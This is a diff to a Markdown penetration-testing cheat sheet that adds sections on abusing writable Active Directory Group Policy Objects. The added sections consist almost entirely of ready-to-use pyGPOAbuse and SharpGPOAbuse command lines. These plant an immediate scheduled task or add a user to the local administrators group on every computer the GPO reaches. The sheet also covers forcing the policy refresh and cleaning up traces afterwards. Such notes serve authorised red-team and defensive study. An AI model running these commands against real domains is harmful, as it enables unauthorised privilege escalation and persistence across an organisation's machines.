@@ -21,3 +21,28 @@ Get-GPInheritance -Target '<OU-OR-DOMAIN-DN>' -Domain '<DOMAIN.TLD>' -Server '<D
     Format-List GpoInheritanceBlocked,GpoLinks,InheritedGpoLinks
 ```
 - `Backup-GPO` needs the output folder to exist (`New-Item -ItemType Directory .\gpo-backup`).
+
+## Abuse: immediate scheduled task (from Kali)
+`pyGPOAbuse` edits the GPO's `ScheduledTasks.xml` directly over LDAP/SMB — no Windows foothold needed.
+```bash
+python3 pygpoabuse.py '<DOMAIN.TLD>/<USER>:<PW>' -gpo-id '<GPO-GUID>' -powershell -command 'net localgroup administrators <LOCAL-USER> /add' -dc-ip <DC-IP>
+```
+Trigger on the target (or wait for the policy refresh interval):
+```cmd
+gpupdate /force
+```
+Cleanup — deletes the Immediate-Task XML **and rolls back the GPO version** in one step:
+```bash
+python3 pygpoabuse.py '<DOMAIN.TLD>/<USER>:<PW>' -gpo-id '<GPO-GUID>' --cleanup -dc-ip <DC-IP>
+```
+- `-user`: run as the logged-on user instead of SYSTEM (computer policy context is the default).
+- Kerberos ticket instead of password: `-k -no-pass -ccache <CCACHE-FILE>`.
+
+## Abuse: immediate task or local admin (from Windows)
+```cmd
+SharpGPOAbuse.exe --AddComputerTask --TaskName <TASK> --Author <DOMAIN>\<USER> --Command cmd.exe --Arguments "/c net localgroup administrators <LOCAL-USER> /add" --GPOName '<GPO-DISPLAY-NAME>'
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <LOCAL-USER> --GPOName '<GPO-DISPLAY-NAME>'
+gpupdate /force
+```
+- `--GPOName` wants the GPO's display name, not its GUID (compare to `pyGPOAbuse`'s `-gpo-id`).
+- **No built-in cleanup.** SharpGPOAbuse bumps the GPO's AD `versionNumber` and the SYSVOL `GPT.INI` version itself (required for clients to re-pull it) but has no remove/rollback action — manually strip the added entry from `ScheduledTasks.xml` / `GptTmpl.inf` in SYSVOL afterwards, or the task/admin grant (and the version bump) stays.
